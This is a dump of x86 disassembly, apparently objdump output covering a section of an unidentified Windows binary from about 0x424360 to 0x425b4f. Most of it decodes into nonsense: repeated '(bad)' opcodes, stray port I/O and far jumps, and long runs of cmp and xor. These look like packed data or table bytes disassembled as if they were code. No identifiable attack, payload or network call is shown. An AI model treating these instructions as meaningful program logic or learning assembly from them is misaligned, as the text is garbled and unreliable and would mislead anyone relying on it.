  424360:	(bad)  
  424361:	sar    BYTE PTR [ebp+0x24e3f538],0xf5
  424368:	lea    esp,[edx]
  42436a:	mov    edi,0x1a6b4b93
  42436f:	nop
  424370:	dec    edi
  424371:	or     al,0x8d
  424373:	xchg   esi,eax
  424374:	cmc    
  424375:	mov    dh,0x83
  424378:	out    dx,al
  424379:	sub    al,0x12
  42437b:	xchg   esi,eax
  42437c:	mov    edi,DWORD PTR [ebx]
  42437e:	inc    bp
  424380:	(bad)  
  424381:	or     BYTE PTR [ebp-0x45],ah
  424384:	push   eax
  424385:	adc    al,0xa7
  424387:	mov    WORD PTR [eax+0x34ca7454],fs
  42438d:	push   0x9
  42438f:	push   ds
  424390:	xor    BYTE PTR [esi+0xd],cl
  424393:	sahf   
  424394:	repnz arpl WORD PTR [ecx],dx
  424397:	xchg   DWORD PTR [ecx-0x23],ebp
  42439a:	cmp    DWORD PTR [ecx-0x19],esi
  42439d:	jmp    0x424327
  42439f:	push   edx
  4243a0:	popf   
  4243a1:	xchg   esi,edi
  4243a3:	sbb    al,0x7e
  4243a5:	test   BYTE PTR [edi+ebx*1+0x7ba58427],dl
  4243ac:	push   edi
  4243ad:	adc    eax,0x5956dd9d
  4243b2:	test   al,0xb4
  4243b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243b5:	fstp   st(3)
  4243b7:	dec    ebp
  4243b8:	cwde   
  4243b9:	outs   dx,BYTE PTR ds:[esi]
  4243ba:	popf   
  4243bb:	addr16 xchg edi,eax
  4243bd:	aaa    
  4243be:	adc    ch,dh
  4243c0:	aas    
  4243c1:	lahf   
  4243c2:	inc    esp
  4243c3:	test   al,0x31
  4243c5:	retf   0xf9fd
  4243c8:	cmp    al,0xe6
  4243ca:	jnp    0x4243e7
  4243cc:	mov    bl,0x61
  4243ce:	sub    DWORD PTR [ebx],edi
  4243d0:	pop    ebp
  4243d1:	inc    esi
  4243d2:	push   edi
  4243d3:	pusha  
  4243d4:	inc    ebx
  4243d5:	adc    eax,DWORD PTR [ebx]
  4243d7:	dec    esi
  4243d8:	ins    DWORD PTR es:[edi],dx
  4243d9:	icebp  
  4243da:	add    dh,dh
  4243dc:	enter  0x82f1,0x1d
  4243e0:	imul   DWORD PTR [edx]
  4243e2:	inc    ebp
  4243e3:	in     al,dx
  4243e4:	daa    
  4243e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243e6:	fld    DWORD PTR [ecx+eiz*1+0x581b9baa]
  4243ed:	imul   ebp,DWORD PTR [ebx],0x839fc712
  4243f3:	and    BYTE PTR [eax],0x8f
  4243f6:	lock pushf 
  4243f8:	add    DWORD PTR [ebx],edx
  4243fa:	in     eax,dx
  4243fb:	add    eax,0x8262c9f
  424400:	sbb    DWORD PTR [eax],esi
  424402:	int3   
  424403:	dec    DWORD PTR [esi]
  424405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424406:	and    al,0x9f
  424408:	xchg   ebx,eax
  424409:	dec    eax
  42440a:	adc    eax,0x70f71633
  42440f:	jne    0x424398
  424411:	mov    ah,0xe1
  424413:	ret    
  424414:	fucomip st,st(2)
  424416:	fld    QWORD PTR [esi]
  424418:	daa    
  424419:	mov    ds:0xaac33d1e,eax
  42441e:	fld    QWORD PTR [esi-0x60b1683d]
  424424:	mov    esi,0xbb842c6
  424429:	cmp    DWORD PTR [edi-0x3a681c84],0xa14f2555
  424433:	pop    es
  424434:	pop    esi
  424435:	inc    ebx
  424436:	sbb    BYTE PTR [eax+0x373b3571],ah
  42443c:	cmp    ch,dh
  42443e:	pop    si
  424440:	out    dx,al
  424441:	cld    
  424442:	pop    ebx
  424443:	xchg   edi,eax
  424444:	stos   DWORD PTR es:[edi],eax
  424445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424446:	jg     0x424480
  424448:	lds    ebx,FWORD PTR [edx]
  42444a:	and    BYTE PTR [esi-0x741072e0],dl
  424450:	inc    ebx
  424451:	inc    edi
  424452:	inc    edx
  424453:	dec    edx
  424454:	retf   0xb5bb
  424457:	ret    
  424458:	sub    BYTE PTR [ebp+0x6d89d46],bh
  42445e:	mov    al,ds:0x66c81ea7
  424463:	lea    ecx,[edx]
  424465:	fs push 0xfffffff4
  424468:	cld    
  424469:	xchg   edi,eax
  42446a:	jb     0x4244b4
  42446c:	xor    eax,0x4c0e017b
  424471:	jecxz  0x42440e
  424473:	imul   DWORD PTR [eax-0x61200e58]
  424479:	jle    0x4244cb
  42447b:	xor    bl,BYTE PTR [ecx]
  42447d:	mov    DWORD PTR [eax-0x6a601ac],esp
  424483:	lds    edx,FWORD PTR [ebx+ecx*2]
  424486:	push   ecx
  424487:	in     al,0x52
  424489:	out    dx,eax
  42448a:	fistp  DWORD PTR [ebp+0x2a]
  42448d:	sub    DWORD PTR [ecx+0x39],ecx
  424490:	scas   al,BYTE PTR es:[edi]
  424491:	in     al,dx
  424492:	aad    0xa7
  424494:	or     dl,BYTE PTR [esi+eax*2-0x47]
  424498:	(bad)  [ebx+0x48]
  42449b:	adc    ebp,0xffffffc1
  42449e:	push   eax
  42449f:	int    0x76
  4244a1:	mov    ch,0x4a
  4244a3:	mov    ebp,0xd2f48a65
  4244a8:	dec    esi
  4244a9:	out    0xd0,eax
  4244ab:	fild   WORD PTR ss:[bx+di-0x3f0a]
  4244b1:	pop    es
  4244b2:	in     eax,dx
  4244b3:	fst    QWORD PTR [edx-0xf]
  4244b6:	pusha  
  4244b7:	pop    ebx
  4244b8:	ds sbb al,0x48
  4244bb:	cmp    bl,BYTE PTR [edi-0x23f6138d]
  4244c1:	ds cld 
  4244c3:	xor    eax,0xfc79a734
  4244c8:	ret    0x923e
  4244cb:	scas   al,BYTE PTR es:[edi]
  4244cc:	push   ds
  4244cd:	enter  0xa505,0x47
  4244d1:	mov    esp,esp
  4244d3:	std    
  4244d4:	and    BYTE PTR [ebp-0x46],0xa7
  4244d8:	outs   dx,DWORD PTR ds:[esi]
  4244d9:	inc    edi
  4244da:	and    eax,0x8744331
  4244df:	into   
  4244e0:	rol    DWORD PTR [esi],0x7e
  4244e3:	mov    bh,0xe8
  4244e5:	sahf   
  4244e6:	icebp  
  4244e7:	pop    ss
  4244e8:	mov    gs,WORD PTR [esi-0x7]
  4244eb:	shl    ah,1
  4244ed:	push   0x263a583e
  4244f2:	add    esi,DWORD PTR [ebx+eiz*4-0x1624ae53]
  4244f9:	mov    ecx,DWORD PTR [eax+0x27]
  4244fc:	fcomp  st(5)
  4244fe:	cwde   
  4244ff:	jg     0x42450b
  424501:	xchg   edx,eax
  424502:	arpl   WORD PTR [edx+eax*2+0xf],bp
  424506:	fwait
  424507:	inc    ebp
  424508:	jb     0x424571
  42450a:	push   edi
  42450b:	lea    esi,[esi]
  42450d:	sbb    edi,0xffffffed
  424510:	cmp    eax,0x65350e63
  424515:	or     al,0xe3
  424517:	jp     0x4244bd
  424519:	icebp  
  42451a:	dec    esp
  42451b:	enter  0x683b,0xa4
  42451f:	push   edi
  424520:	ins    DWORD PTR es:[edi],dx
  424521:	mov    esi,0x8c520efb
  424526:	mov    al,0xfa
  424528:	es add al,0xe2
  42452b:	jmp    0x42453b
  42452d:	sbb    dh,BYTE PTR [ebx]
  42452f:	je     0x424546
  424531:	repnz ss sub eax,0x8b8b59e7
  424538:	test   al,0x4d
  42453a:	bound  edi,QWORD PTR ds:0x7ba7ffce
  424540:	outs   dx,DWORD PTR ds:[esi]
  424541:	jp     0x4245a2
  424543:	addr16 retf 
  424545:	adc    bl,bh
  424547:	les    edi,FWORD PTR [edi]
  424549:	sti    
  42454a:	clc    
  42454b:	mov    BYTE PTR [ebp+ebx*2-0x7e],cl
  42454f:	mov    ebx,0x2bf4ff8c
  424554:	cmp    eax,DWORD PTR [esi-0x5a01c034]
  42455a:	retf   0xde0
  42455d:	cmp    BYTE PTR [ebx],ch
  42455f:	iret   
  424560:	lods   al,BYTE PTR ds:[esi]
  424561:	mov    al,ds:0xa2d59706
  424566:	retf   0x60ae
  424569:	ficom  WORD PTR [eax-0x589bf461]
  42456f:	cmp    al,0xb
  424571:	int3   
  424572:	inc    ebx
  424573:	fimul  WORD PTR [esi]
  424575:	mov    WORD PTR [ebp+0x26c25b22],fs
  42457b:	sub    eax,0xd6b6995d
  424580:	add    edx,DWORD PTR ds:0x29a7999c
  424586:	or     BYTE PTR [ecx+0x3aa6610e],bl
  42458c:	ret    0x4111
  42458f:	sbb    ah,BYTE PTR [esi+0x2e342c9e]
  424595:	fwait
  424596:	and    edx,edx
  424598:	popf   
  424599:	outs   dx,DWORD PTR ds:[esi]
  42459a:	retf   
  42459b:	es stc 
  42459d:	dec    ebp
  42459e:	mov    ds:0xe7291444,al
  4245a3:	mov    al,0x37
  4245a5:	xor    esp,DWORD PTR [edi-0x4e]
  4245a8:	rcr    BYTE PTR [esi],0xc8
  4245ab:	mov    ch,0xf1
  4245ad:	mov    BYTE PTR [edi],0xde
  4245b0:	(bad)  
  4245b1:	inc    DWORD PTR [edi+0x4f74da71]
  4245b7:	xchg   BYTE PTR [ecx],dh
  4245b9:	(bad)
  4245bc:	mov    esi,0xc53c4d50
  4245c1:	jecxz  0x424607
  4245c3:	in     eax,0x56
  4245c5:	xchg   ebx,eax
  4245c6:	test   al,0xef
  4245c8:	and    eax,0x46634fd2
  4245cd:	cmc    
  4245ce:	repz pop ds
  4245d0:	pop    eax
  4245d1:	mov    ch,0x3e
  4245d3:	or     al,0xd4
  4245d5:	push   ebp
  4245d6:	dec    ebx
  4245d7:	sub    al,0x2a
  4245d9:	jne    0x4245aa
  4245db:	sbb    BYTE PTR [esi],bl
  4245dd:	cmp    ebp,edi
  4245df:	pop    es
  4245e0:	push   0xffffffaa
  4245e2:	pop    ecx
  4245e3:	clc    
  4245e4:	sbb    edi,0xc37dbb46
  4245ea:	rcl    DWORD PTR [esi+0x1],0x87
  4245ee:	xor    ah,dl
  4245f0:	popa   
  4245f1:	rol    BYTE PTR [eax+esi*8],1
  4245f4:	xchg   ecx,eax
  4245f5:	inc    esi
  4245f6:	mov    ds:0xeeeca515,eax
  4245fb:	adc    edi,DWORD PTR [edx]
  4245fd:	mov    ds:0xf3670f58,eax
  424602:	stos   BYTE PTR es:[edi],al
  424603:	or     DWORD PTR [ebp+edi*2-0x60],edi
  424607:	pop    edi
  424608:	ja     0x42467a
  42460a:	pop    ss
  42460b:	rcl    DWORD PTR [eax-0x78],0xa9
  42460f:	cmp    edi,esp
  424611:	mov    bh,BYTE PTR [ebp-0x4d]
  424614:	shl    DWORD PTR [esi],cl
  424616:	fist   WORD PTR [ebx+ecx*1]
  424619:	jmp    0x5bc2d563
  42461e:	xor    BYTE PTR [edi-0x3c],cl
  424621:	xor    BYTE PTR es:[ecx],0xa2
  424625:	(bad)  
  424627:	lods   al,BYTE PTR ds:[esi]
  424628:	in     al,0xd1
  42462a:	dec    ebp
  42462b:	gs jp  0x4245c6
  42462e:	(bad)  
  42462f:	mov    al,ds:0x8b18a9fa
  424634:	fmul   DWORD PTR [esi-0x2e]
  424637:	ficomp DWORD PTR [ecx]
  424639:	jbe    0x424682
  42463b:	cmp    esp,DWORD PTR [ecx-0x7753d737]
  424641:	jo     0x42468d
  424643:	inc    ecx
  424644:	push   cs
  424645:	pop    ebx
  424646:	repz jp 0x4246c6
  424649:	aaa    
  42464a:	dec    esp
  42464b:	rol    al,cl
  42464d:	push   edx
  42464e:	shl    ah,1
  424650:	scas   al,BYTE PTR es:[edi]
  424651:	jmp    0x4246b1
  424653:	(bad)  
  424655:	mov    esp,0x3ca7a0f3
  42465a:	pop    ss
  42465b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42465c:	inc    esp
  42465d:	or     BYTE PTR [eax],bh
  42465f:	add    eax,0x664807ba
  424664:	stos   BYTE PTR es:[edi],al
  424665:	retf   0x479c
  424668:	scas   al,BYTE PTR es:[edi]
  424669:	add    BYTE PTR [eax+0x5f],ch
  42466c:	or     bh,BYTE PTR [eax-0x355f866d]
  424672:	and    ch,BYTE PTR [ebx+0x3d]
  424675:	dec    eax
  424676:	mov    al,ds:0x8ced52a7
  42467b:	mov    ah,0x7f
  42467d:	stos   BYTE PTR es:[edi],al
  42467e:	jae    0x4246bd
  424680:	add    BYTE PTR [eax-0x5a6eaccd],ch
  424686:	inc    ecx
  424687:	js     0x4246cc
  424689:	jae    0x424626
  42468b:	or     DWORD PTR [ecx+0x25848d04],esp
  424691:	ins    BYTE PTR es:[edi],dx
  424692:	sar    ecx,1
  424694:	xor    cl,bh
  424696:	mov    al,0xdc
  424698:	mov    ebp,0x8810c5a3
  42469d:	or     ch,BYTE PTR [ebx]
  42469f:	or     al,0xfa
  4246a1:	lahf   
  4246a2:	adc    BYTE PTR [ebp-0x41946a52],ch
  4246a8:	pop    ebx
  4246a9:	sbb    DWORD PTR [eax+0x5eca2d1],edx
  4246af:	in     eax,dx
  4246b0:	mov    dh,0x9
  4246b2:	mov    ds:0xd24839de,al
  4246b7:	es pop ebx
  4246b9:	push   0x713b9031
  4246be:	mov    ch,0x49
  4246c0:	jmp    0x4246fb
  4246c2:	cmp    esi,esi
  4246c4:	push   ebx
  4246c5:	inc    esp
  4246c6:	je     0x42465f
  4246c8:	mov    bh,BYTE PTR [ebp+0x65e7770d]
  4246ce:	(bad)  
  4246cf:	adc    DWORD PTR [ecx-0x78],esi
  4246d2:	jmp    0x5fd:0xee7bd6cc
  4246d9:	inc    eax
  4246da:	fnstenv [eax]
  4246dc:	jnp    0x424743
  4246de:	xor    ch,ah
  4246e0:	inc    esp
  4246e1:	xchg   edi,eax
  4246e2:	into   
  4246e3:	(bad)  
  4246e4:	jbe    0x424689
  4246e6:	call   0x56a2e100
  4246eb:	dec    esi
  4246ec:	cld    
  4246ed:	mov    ch,bl
  4246ef:	(bad)  
  4246f0:	push   edi
  4246f1:	xchg   edi,eax
  4246f2:	inc    eax
  4246f3:	sbb    BYTE PTR [edi],dl
  4246f5:	push   0x5b1383a3
  4246fa:	adc    DWORD PTR [esi-0x5c],0x965c89c2
  424701:	dec    ebp
  424702:	inc    ebp
  424703:	pop    edi
  424704:	push   ebp
  424705:	or     edi,DWORD PTR ss:[edi-0x12]
  424709:	mov    ah,0xd9
  42470b:	(bad)  ds:0x2772a5a7
  424711:	fwait
  424712:	out    dx,al
  424713:	sub    eax,0xc8976a67
  424718:	or     ch,BYTE PTR [ebx]
  42471a:	add    bh,BYTE PTR [esi]
  42471c:	jmp    0xc21080ab
  424721:	pop    ecx
  424722:	addr16 pop edx
  424724:	xor    al,0x50
  424726:	jno    0x4246b7
  424728:	cld    
  424729:	pop    ecx
  42472a:	loope  0x4247a6
  42472c:	sbb    bh,ah
  42472e:	push   0xffffffd2
  424730:	mov    esi,0x58e6bf62
  424735:	sahf   
  424736:	cwde   
  424737:	aaa    
  424738:	out    dx,eax
  424739:	std    
  42473a:	stc    
  42473b:	fstp   st(7)
  42473d:	inc    edx
  42473e:	retf   
  42473f:	dec    esp
  424740:	jnp    0x424724
  424742:	aas    
  424743:	jnp    0x42478f
  424745:	xlat   BYTE PTR ds:[ebx]
  424746:	push   es
  424747:	and    al,cl
  424749:	mov    dh,0x80
  42474b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42474c:	add    eax,0x73a08036
  424751:	int    0xf6
  424753:	push   es
  424754:	fdiv   QWORD PTR [ebp+ebp*2+0x16]
  424758:	and    BYTE PTR [ebx+0x68],bh
  42475b:	add    eax,0x2e8db19d
  424760:	ss int3 
  424762:	mov    fs,WORD PTR [edi-0x2c2832f0]
  424768:	mov    al,ds:0x5ed81195
  42476d:	push   edx
  42476e:	scas   al,BYTE PTR es:[edi]
  42476f:	dec    ebp
  424770:	push   ebp
  424771:	and    BYTE PTR [edi+0x76],bh
  424774:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424775:	gs retf 
  424777:	vpackssdw ymm1,ymm3,YMMWORD PTR [edx-0xda15399]
  42477f:	lock out 0x6f,eax
  424782:	sub    al,0xd0
  424784:	inc    eax
  424785:	lahf   
  424786:	(bad)  [edx]
  424788:	or     al,0x40
  42478a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42478b:	sub    DWORD PTR [edi+0x16],ecx
  42478e:	pop    edx
  42478f:	mov    dl,0xa5
  424791:	jo     0x4247f7
  424793:	and    DWORD PTR [edx-0x6d],0x5709fe82
  42479a:	ret    0x2c5b
  42479d:	fiadd  DWORD PTR [eax+ebx*1]
  4247a0:	popf   
  4247a1:	data16 adc BYTE PTR [ebx-0x3e],0xd0
  4247a6:	in     eax,dx
  4247a7:	push   0x19
  4247a9:	sbb    al,0x34
  4247ab:	repnz inc edi
  4247ad:	ins    DWORD PTR es:[edi],dx
  4247ae:	add    eax,DWORD PTR [edi]
  4247b0:	loope  0x4247ec
  4247b2:	mov    bl,0x26
  4247b4:	mov    ah,0xe7
  4247b6:	jo     0x42482d
  4247b8:	xrstor [ecx+0x66]
  4247bc:	popf   
  4247bd:	mov    ebp,0x3d7ab6d0
  4247c2:	popa   
  4247c3:	addr16 call 0x59bddf0a
  4247c9:	add    bh,dh
  4247cb:	call   DWORD PTR ds:0x85893b9f
  4247d1:	ja     0x424754
  4247d3:	bound  edx,QWORD PTR [esi+0x7b8e7ca7]
  4247d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247da:	leave  
  4247db:	test   bl,dh
  4247dd:	mov    bh,0x5
  4247df:	addr16 inc esi
  4247e1:	cs stc 
  4247e3:	xor    dh,bl
  4247e5:	mov    esi,0x5a01cd36
  4247ea:	push   ebp
  4247eb:	pushf  
  4247ec:	push   es
  4247ed:	mov    dl,0xd7
  4247ef:	loopne 0x4247b6
  4247f1:	mov    esp,0x46d3acfc
  4247f6:	test   eax,0x77bc2ac0
  4247fb:	push   edi
  4247fc:	inc    esp
  4247fd:	rcr    DWORD PTR [ebx-0x41],cl
  424800:	call   0x0:0x0
	...
  424847:	add    BYTE PTR [eax],al
  424849:	cwde   
  42484a:	and    BYTE PTR [eax],dl
  42484c:	add    BYTE PTR [eax+0x3],bh
  42484f:	adc    BYTE PTR [eax],al
  424851:	mov    ebp,0xf600105c
  424856:	push   ebp
  424857:	adc    BYTE PTR [eax],al
  424859:	and    eax,0x3800107b
  42485e:	cmp    DWORD PTR [eax],edx
  424860:	add    BYTE PTR [ebp+edx*1+0x1e9b0010],cl
  424867:	adc    BYTE PTR [eax],al
	...
  425869:	add    BYTE PTR [eax],dl
  42586b:	add    BYTE PTR [eax],al
  42586d:	in     al,dx
  42586e:	add    BYTE PTR [eax],al
  425870:	add    BYTE PTR [edx],ch
  425872:	xor    BYTE PTR [eax],dh
  425874:	xor    BYTE PTR ds:0x58304c30,dh
  42587a:	xor    BYTE PTR [esi+0x30],bl
  42587d:	xor    BYTE PTR fs:[eax-0x65cf71d0],cl
  425884:	xor    BYTE PTR [eax-0x4ccf59d0],ah
  42588a:	xor    al,al
  42588c:	xor    bh,cl
  42588e:	xor    BYTE PTR [edx-0x48ce51cf],ch
  425894:	xor    esp,eax
  425896:	xor    eax,ecx
  425898:	xor    DWORD PTR [ebp-0x60cc6ece],esp
  42589e:	xor    ebp,DWORD PTR [esi-0x3acc47cd]
  4258a4:	xor    edx,ebp
  4258a6:	xor    ebx,ebp
  4258a8:	xor    esp,esp
  4258aa:	xor    ebp,edi
  4258ac:	xor    edi,ebp
  4258ae:	xor    ecx,DWORD PTR [eax]
  4258b0:	xor    al,0xc
  4258b2:	xor    al,0x14
  4258b4:	xor    al,0x28
  4258b6:	xor    al,0x2e
  4258b8:	xor    al,0x40
  4258ba:	xor    al,0x46
  4258bc:	xor    al,0xf8
  4258be:	xor    eax,0x360435fc
  4258c3:	push   cs
  4258c4:	sbb    esi,DWORD PTR ss:[esi]
  4258c7:	sub    esi,DWORD PTR [esi]
  4258c9:	xor    DWORD PTR [esi],esi
  4258cb:	cmp    eax,0x48364336
  4258d0:	ss dec esi
  4258d2:	ss pop esp
  4258d4:	ss push 0x7f367b36
  4258da:	ss pop edi
  4258dc:	aaa    
  4258dd:	imul   esi,DWORD PTR [edi],0x7e
  4258e0:	aaa    
  4258e1:	xor    BYTE PTR [edi],0x8d
  4258e4:	aaa    
  4258e5:	call   0xb637:0xb037a937
  4258ec:	aaa    
  4258ed:	ret    
  4258ee:	aaa    
  4258ef:	shl    DWORD PTR [edi],cl
  4258f1:	mov    ah,0x38
  4258f3:	mov    ebp,0xce38ca38
  4258f8:	cmp    dh,dl
  4258fa:	cmp    dl,ah
  4258fc:	cmp    dl,dh
  4258fe:	cmp    dh,dh
  425900:	cmp    BYTE PTR [ebx-0x33c53fc6],dh
  425906:	cmp    ah,dl
  425908:	cmp    ch,dh
  42590a:	cmp    dh,ch
  42590c:	cmp    bh,bl
  42590e:	cmp    al,BYTE PTR [edi]
  425910:	cmp    ecx,DWORD PTR [ebx+edi*1]
  425913:	adc    eax,0x2a3b1b3b
  425918:	cmp    esi,DWORD PTR [ecx]
  42591a:	cmp    esi,DWORD PTR [edi]
  42591c:	cmp    eax,DWORD PTR [ebx+edi*1+0x30]
  425920:	cmp    al,0x34
  425922:	cmp    al,0x3e
  425924:	cmp    al,0x44
  425926:	cmp    al,0x49
  425928:	cmp    al,0x52
  42592a:	cmp    al,0x5b
  42592c:	cmp    al,0x6a
  42592e:	cmp    al,0x71
  425930:	cmp    al,0x77
  425932:	cmp    al,0x84
  425934:	cmp    al,0x9d
  425936:	cmp    al,0xa6
  425938:	cmp    al,0xac
  42593a:	cmp    al,0xb9
  42593c:	cmp    al,0xc0
  42593e:	cmp    al,0xce
  425940:	cmp    al,0xd7
  425942:	cmp    al,0xba
  425944:	cmp    eax,0x3dd13dc4
  425949:	loope  0x425988
  42594b:	out    0x3d,eax
  42594d:	hlt    
  42594e:	cmp    eax,0x3e013dfb
  425953:	or     BYTE PTR [esi],bh
  425955:	add    BYTE PTR [eax],ah
  425957:	add    BYTE PTR [eax],al
  425959:	dec    eax
  42595a:	add    BYTE PTR [eax],al
  42595c:	add    BYTE PTR [ebx],bh
  42595e:	cmp    al,0x4c
  425960:	cmp    al,0x52
  425962:	cmp    al,0x58
  425964:	cmp    al,0x65
  425966:	cmp    al,0x73
  425968:	cmp    al,0x7f
  42596a:	cmp    al,0x85
  42596c:	cmp    al,0x94
  42596e:	cmp    al,0x9a
  425970:	cmp    al,0xa5
  425972:	cmp    al,0xaf
  425974:	cmp    al,0xb6
  425976:	cmp    al,0xbc
  425978:	cmp    al,0xc8
  42597a:	cmp    al,0xd6
  42597c:	cmp    al,0xdc
  42597e:	cmp    al,0xe9
  425980:	cmp    al,0xf0
  425982:	cmp    al,0xf6
  425984:	cmp    al,0x9
  425986:	cmp    eax,0x3d203d13
  42598b:	sub    al,0x3d
  42598d:	xor    DWORD PTR ds:0x3d403d3b,edi
  425993:	inc    ebp
  425994:	cmp    eax,0x3d513d4b
  425999:	pop    eax
  42599a:	cmp    eax,0x30000000
  42599f:	add    BYTE PTR [eax],al
  4259a1:	or     al,0x1
  4259a3:	add    BYTE PTR [eax],al
  4259a5:	push   ebx
  4259a6:	xor    bl,BYTE PTR [ecx+0x32]
  4259a9:	xor    ch,BYTE PTR gs:[ebx+0x32]
  4259ad:	jae    0x4259e1
  4259af:	jns    0x4259e3
  4259b1:	test   BYTE PTR [edx],dh
  4259b3:	mov    BYTE PTR [edx],dh
  4259b5:	(bad)  
  4259b6:	xor    bl,BYTE PTR [esi-0x54cd5ace]
  4259bc:	xor    bh,BYTE PTR [eax-0x27cd36ce]
  4259c2:	xor    ah,dh
  4259c4:	xor    ch,dl
  4259c6:	xor    bh,cl
  4259c8:	xor    bh,bh
  4259ca:	xor    ah,BYTE PTR [ecx+0x34]
  4259cd:	addr16 xor al,0x1d
  4259d0:	xor    eax,0x35333529
  4259d5:	cmp    BYTE PTR ds:0x355a3543,dh
  4259db:	arpl   WORD PTR ds:0x357a356d,si
  4259e1:	xchg   BYTE PTR ds:0x3591358b,dh
  4259e7:	xchg   esi,eax
  4259e8:	xor    eax,0x35a7359c
  4259ed:	mov    ebx,0xce35c135
  4259f2:	xor    eax,0x3758374f
  4259f7:	pop    esi
  4259f8:	aaa    
  4259f9:	jb     0x425a32
  4259fb:	jnp    0x425a34
  4259fd:	test   DWORD PTR [edi],esi
  4259ff:	mov    WORD PTR [edi],?
  425a01:	xchg   edx,eax
  425a02:	aaa    
  425a03:	sahf   
  425a04:	aaa    
  425a05:	lods   al,BYTE PTR ds:[esi]
  425a06:	aaa    
  425a07:	mov    dl,0x37
  425a09:	shl    DWORD PTR [edi],0xc8
  425a0c:	aaa    
  425a0d:	into   
  425a0e:	aaa    
  425a0f:	(bad)  [edi]
  425a11:	call   0x127a5d4d
  425a16:	cmp    BYTE PTR [ecx],bl
  425a18:	cmp    BYTE PTR [edi],bl
  425a1a:	cmp    BYTE PTR [eax+edi*1],ch
  425a1d:	cmp    eax,0x49384338
  425a22:	cmp    BYTE PTR [esi+0x38],dl
  425a25:	pop    ebp
  425a26:	cmp    BYTE PTR [eax+0x38],ch
  425a29:	mov    BYTE PTR [eax],bh
  425a2b:	xchg   esp,eax
  425a2c:	cmp    BYTE PTR [ecx-0x43c74ec8],ah
  425a32:	cmp    dh,cl
  425a34:	cmp    ch,bl
  425a36:	cmp    ah,ah
  425a38:	cmp    dl,ch
  425a3a:	cmp    bh,dh
  425a3c:	cmp    BYTE PTR [esi],cl
  425a3e:	cmp    DWORD PTR [ecx],ebx
  425a40:	cmp    DWORD PTR [esi],esp
  425a42:	cmp    DWORD PTR [edi-0x4fc55bc6],edx
  425a48:	cmp    bh,BYTE PTR [edx+edi*1+0x3ae63ac8]
  425a4f:	idiv   DWORD PTR [edx]
  425a51:	(bad)  
  425a52:	cmp    al,BYTE PTR [ebx+edi*1]
  425a55:	adc    DWORD PTR [ebx],edi
  425a57:	and    DWORD PTR [ebx],edi
  425a59:	daa    
  425a5a:	cmp    esi,DWORD PTR [esi]
  425a5c:	cmp    edi,DWORD PTR ds:0x593b483b
  425a62:	cmp    esp,DWORD PTR [eax+0x3b]
  425a65:	cmp    si,WORD PTR [ebx+0x3b]
  425a69:	xchg   edx,eax
  425a6a:	cmp    ebx,DWORD PTR [edi+0x163ba73b]
  425a70:	cmp    eax,0x3d273d20
  425a75:	sub    eax,0x433d3d3d
  425a7a:	cmp    eax,0x3d5f3d50
  425a7f:	jae    0x425abe
  425a81:	jle    0x425ac0
  425a83:	xchg   BYTE PTR ds:0x3d9c3d96,bh
  425a89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a8a:	cmp    eax,0x3dbc3daf
  425a8f:	retf   
  425a90:	cmp    eax,0x3dd73dd1
  425a95:	fidivr WORD PTR ds:0x3df83de9
  425a9b:	(bad)  
  425a9c:	cmp    eax,0x3e123e05
  425aa1:	dec    ebx
  425aa2:	ds push ecx
  425aa4:	ds pop esi
  425aa6:	ds gs add BYTE PTR ds:[eax+0x0],dl
  425aac:	add    BYTE PTR [eax+0x26000000],cl
  425ab2:	xor    DWORD PTR [ebx],esi
  425ab4:	xor    DWORD PTR [edx+0x31],eax
  425ab7:	dec    ecx
  425ab8:	xor    DWORD PTR [edi+0x31],ecx
  425abb:	pop    esp
  425abc:	xor    DWORD PTR [esi+0x31],ebp
  425abf:	ja     0x425af2
  425ac1:	xor    DWORD PTR [ecx],0xffffff89
  425ac4:	xor    edx,eax
  425ac6:	xor    edx,ebx
  425ac8:	xor    edx,edi
  425aca:	xor    esp,ebp
  425acc:	xor    esi,edi
  425ace:	xor    eax,DWORD PTR [ebx]
  425ad0:	xor    al,0x7
  425ad2:	xor    al,0x10
  425ad4:	xor    al,0x1a
  425ad6:	xor    al,0x27
  425ad8:	xor    al,0x33
  425ada:	xor    al,0x38
  425adc:	xor    al,0x3e
  425ade:	xor    al,0x43
  425ae0:	xor    al,0x49
  425ae2:	xor    al,0xb6
  425ae4:	xor    eax,0x35d135be
  425ae9:	xlat   BYTE PTR ds:[ebx]
  425aea:	xor    eax,0x386d3727
  425aef:	jno    0x425b29
  425af1:	jle    0x425b2b
  425af3:	mov    bh,BYTE PTR [eax]
  425af5:	xchg   ecx,eax
  425af6:	cmp    BYTE PTR [edi-0x53c759c8],dl
  425afc:	cmp    BYTE PTR [edx-0x54c489c8],dh
  425b02:	cmp    al,0xb3
  425b04:	cmp    al,0xb9
  425b06:	cmp    al,0xbd
  425b08:	cmp    al,0xcf
  425b0a:	cmp    al,0xdf
  425b0c:	cmp    al,0xea
  425b0e:	cmp    al,0xee
  425b10:	cmp    al,0xf5
  425b12:	cmp    al,0xfc
  425b14:	cmp    al,0x6
  425b16:	cmp    eax,0x3d2d3d13
  425b1b:	xor    edi,DWORD PTR ds:0x3d493d42
  425b21:	dec    edi
  425b22:	cmp    eax,0x3d613d56
  425b27:	lahf   
  425b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b2a:	ds loope 0x425b6c
  425b2d:	jmp    0x425b6e
  425b2f:	clc    
  425b30:	aas    
  425b31:	add    BYTE PTR [eax+0x0],ah
  425b34:	add    BYTE PTR [eax+0x0],bh
  425b37:	add    BYTE PTR [eax],al
  425b39:	add    al,0x30
  425b3b:	or     dh,BYTE PTR [eax]
  425b3d:	adc    dh,BYTE PTR [eax]
  425b3f:	sbb    BYTE PTR [eax],dh
  425b41:	xor    DWORD PTR [eax],esi
  425b43:	inc    edx
  425b44:	xor    BYTE PTR [edi+0x30],cl
  425b47:	pusha  
  425b48:	xor    BYTE PTR [esi+0x30],ah
  425b4b:	ins    BYTE PTR es:[edi],dx
  425b4c:	xor    BYTE PTR [ecx+0x30],bh
  425b4f:	mov    dh,BYTE PTR [eax]
